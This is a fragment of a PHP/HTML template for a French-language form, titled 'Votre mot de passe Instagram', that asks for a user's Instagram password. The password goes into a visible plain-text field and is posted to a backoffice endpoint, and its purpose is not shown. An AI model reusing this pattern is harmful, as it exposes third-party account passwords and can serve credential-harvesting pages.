			...
			<center><h3 class="text--logo light color--black">Votre mot de passe Instagram</h3></center>  
			  <div class="container">
				...
				<div class="main2">
				  ...
				  <form role="form" class="form-horizontal" method="post" id="cprofilconf" action="<?php echo "/" . $BACKOFFICE_UPDATE_INSTAGRAM; ?>">
					...
					<div class="col-lg-14 col-lg-offset-1">
					  ...
					  <div class="form-group">
					    ...
					    <div class="col-md-10">
					      <input type="text" class="form-control" name="inputPassword" id="inputPassword" value="" placeholder="Votre mot de passe Instagram" required>
					    </div>
					  </div>
